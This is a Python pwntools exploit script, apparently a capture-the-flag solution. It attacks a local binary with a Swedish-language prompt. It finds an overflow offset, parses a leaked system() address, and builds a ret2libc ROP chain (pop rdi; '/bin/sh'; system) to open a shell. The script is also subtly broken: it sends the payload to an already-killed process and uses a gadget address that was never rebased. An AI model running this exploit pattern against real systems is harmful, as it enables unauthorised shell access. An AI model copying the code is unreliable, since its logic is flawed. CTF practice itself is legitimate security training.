from pwn import *


p = process("./a.out")
p.recvline()

d = cyclic(256, n=8)
p.sendline(d)
p.recvline()

raw_offset = p.recvline()[len("addr ") :].strip()
offset = cyclic_find(int(raw_offset.decode(), 16), n=8)

p.kill()

# Start the vulnerable program
c = process("./chall")  # Change if remote

# 🟢 Step 1: Get the leaked system() address
# leak = p.recvline()  # Read the welcome message
# print(leak.decode())

system_addr = int(c.recvline().decode().split("Mitt tur-tal idag är ")[-1].split(". Vad heter du?")[0], 16)

# # Extract system() address from output
# system_addr = int(leak.split(b" ")[-1][:-1], 16)


print(f"[+] Leaked system address: {hex(system_addr)}")

# 🟢 Step 2: Find "/bin/sh" in libc using a known offset
# We assume that the system() address comes from libc.
libc = ELF("libc.so.6")  # Adjust for your system
libc.address = system_addr - libc.symbols["system"]  # Calculate libc base
binsh_addr = next(libc.search(b"/bin/sh"))  # Find /bin/sh in libc

print(f"[+] libc base address: {hex(libc.address)}")
print(f"[+] /bin/sh address: {hex(binsh_addr)}")

# 🟢 Step 3: Find a ROP gadget (pop rdi; ret)
rop = ROP("libc.so.6")
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

print(f"[+] Found pop rdi; ret gadget at: {hex(pop_rdi)}")

# 🟢 Step 4: Construct the exploit payload
payload = b"A" * offset
payload += p64(pop_rdi)       # pop rdi; ret gadget
payload += p64(binsh_addr)    # Address of "/bin/sh"
payload += p64(system_addr)   # Call system("/bin/sh")

# 🟢 Step 5: Send exploit
print(payload)

p.sendline(payload)
print(p.recvall().decode())
p.interactive()  # Get shell
